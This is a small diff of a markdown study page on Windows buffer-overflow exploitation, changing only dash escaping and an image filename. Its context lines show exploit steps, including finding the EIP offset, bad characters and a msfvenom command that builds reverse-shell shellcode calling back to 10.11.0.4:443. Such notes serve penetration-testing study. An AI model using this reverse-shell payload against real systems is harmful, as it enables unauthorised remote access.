@@ -94,9 +94,9 @@ msf-pattern_offset -l 800 -q 42306142
 ```
 
 {% hint style="info" %}
-\-l: the length of the original pattern&#x20;
+-l: the length of the original pattern&#x20;
 
-\-q: specify the bytes found in EIP
+-q: specify the bytes found in EIP
 {% endhint %}
 
 ### 3. Find bad chars&#x20;
@@ -164,9 +164,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/sh
 ```
 
 {% hint style="info" %}
-* \-f c: To select C-formatted shellcode
-* \-e x86/shikata\_ga\_nai: use of the polymorphic encode shikata\_ga\_nai (It can’t be helped)
-* \-b “\x00\x0a..”: specifies the bad chars
+* -f c: To select C-formatted shellcode
+* -e x86/shikata\_ga\_nai: use of the polymorphic encode shikata\_ga\_nai (It can’t be helped)
+* -b “\x00\x0a..”: specifies the bad chars
 {% endhint %}
 
 {% hint style="info" %}
@@ -200,9 +200,9 @@ xxd -g 1 -c 8 exploit_bytes.txt
 ```
 
 {% hint style="info" %}
-\-g: number of octets per group
+-g: number of octets per group
 
-\-c: format octets per line
+-c: format octets per line
 {% endhint %}
 
 #### Find Function Address
@@ -211,7 +211,7 @@ xxd -g 1 -c 8 exploit_bytes.txt
 objdump -D execution-flow-windows.exe | grep <func_name>
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 Need to convert the address to little endian format (00401530 --> \x30\x15\x40\x00)
